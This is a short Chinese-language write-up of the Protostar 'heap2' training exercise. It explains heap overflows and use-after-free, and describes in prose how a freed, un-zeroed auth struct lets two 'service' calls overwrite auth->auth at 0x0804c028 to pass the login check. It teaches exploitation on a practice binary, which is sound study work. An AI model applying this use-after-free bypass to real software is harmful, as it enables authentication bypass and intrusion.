Heap-Overflow Writeup

1.基本介绍

练习使用的镜像来自exploit-exercises中的Protostar，该镜像覆盖的练习内容包括

  • buffer overflows
  • format strings
  • heap exploitation
  • socket programming

这里介绍后面两个部分。

2. heap overflow

heap上数据由程序在运行时通过malloc/free动态分配和释放。堆上漏洞包括

  1. 堆缓冲区溢出
  2. UAF

堆上数据排布及堆块的分配和释放需要通过堆管理器来进行，对堆漏洞利用常需要了解堆的实现机制和分配算法，这些算法往往较复杂，这也是造成堆漏洞利用的困难之一。通过protostrar的几个练习，我们将对堆的结构又一个初步了解。

2.3 heap2

此题中根据用户输入的不同，选择执行不同分支。其中auth分支会分配堆，并设置值，reset会释放堆空间，login将根据auth->auth判断是否登录成功。

思路：堆释放后无清零，可以通过UAF漏洞绕过校验。

以上过程中，给auth分配的地址为0x0804c008,则auth->auth分配的地址为0x0804c028。虽然reset释放了auth，但在login中仍然使用地址为0x0804c028作为auth->auth进行判断。我们在login前调用两次service,即可将0x0804c028地址覆盖为非0，进而通过校验。
